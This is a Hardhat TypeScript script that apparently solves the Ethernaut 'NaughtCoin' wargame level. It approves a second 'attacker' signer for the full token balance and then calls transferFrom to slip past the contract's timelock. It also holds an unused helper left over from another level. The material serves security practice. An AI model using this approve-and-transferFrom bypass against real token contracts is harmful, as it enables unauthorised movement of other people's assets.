import { ethers } from "hardhat";
import { BigNumber } from "ethers";
import { GatekeeperTwo, NaughtCoin } from "../typechain-types";

const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const logMissionStatus = async (gateKeeperTwo: GatekeeperTwo, deployerAddress: string) => {
  const isMissionAccomplished = (await gateKeeperTwo.entrant()) === deployerAddress;
  console.log(`🎯 Mission Accomplished: ${isMissionAccomplished ? '✅ Yes!' : '❌ No!'}`);
};

const getMyBalanceAndAllowance = async (naugthCoin: NaughtCoin, deployerAddress: string, attackerAddress: string) => {
  console.log(`🔍 Fetching balances and allowances...`);
  const myBalance: BigNumber = await naugthCoin.balanceOf(deployerAddress);
  const myAllowance: BigNumber = await naugthCoin.allowance(deployerAddress, attackerAddress);
  console.log(`💰 My balance is: ${myBalance}`);
  console.log(`📝 My allowance is: ${myAllowance}`);
  return { myBalance, myAllowance };
};

const executeTx = async (transactionPromise: Promise<any>, operationMessage: string) => {
  process.stdout.write(`🔄 Executing: ${operationMessage}... `);
  const tx = await transactionPromise;
  const status = (await tx.wait()).status === 1;
  console.log(status ? `✅ Success` : `❌ Failed`);
  await delay(5000);
};

const main = async (): Promise<void> => {
  const [deployer, attacker] = await ethers.getSigners();
  const deployerAddress = await deployer.getAddress();
  const attackerAddress = await attacker.getAddress();

  const naughtCoinAddress = "0x0F06027f0311C7949620B83b0e6E7b907A72157D";
  const naugthCoin: NaughtCoin = await ethers.getContractAt("NaughtCoin", naughtCoinAddress);

  let balances = await getMyBalanceAndAllowance(naugthCoin, deployerAddress, attackerAddress);

  await executeTx(naugthCoin.connect(deployer).approve(attackerAddress, balances.myBalance), "Approve operation");
  balances = await getMyBalanceAndAllowance(naugthCoin, deployerAddress, attackerAddress);

  await executeTx(naugthCoin.connect(attacker).transferFrom(deployerAddress, attackerAddress, balances.myBalance), "TransferFrom operation");
  await getMyBalanceAndAllowance(naugthCoin, deployerAddress, attackerAddress);
};


main().catch(error => {
  console.error('🚫', error);
});
